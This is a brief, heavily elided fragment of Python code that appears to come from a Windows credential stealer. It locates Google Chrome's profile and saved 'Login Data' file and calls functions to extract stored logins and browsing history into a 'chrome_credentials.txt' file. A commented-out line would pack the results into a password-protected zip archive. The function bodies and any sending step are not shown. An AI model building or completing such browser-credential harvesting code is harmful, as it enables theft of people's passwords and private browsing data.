...
if is_windows:
    ...
    if os.path.isdir(chromepath):
        ...
        if os.path.isfile(chromelogindatapath):
            chromelogindata()
            chromehistory()
        else:
            with open('chrome_credentials.txt', 'w') as f:
...
# pyminizip.compress(filePath, None, os.getcwd() + '/plop.zip', "Francknos",1)
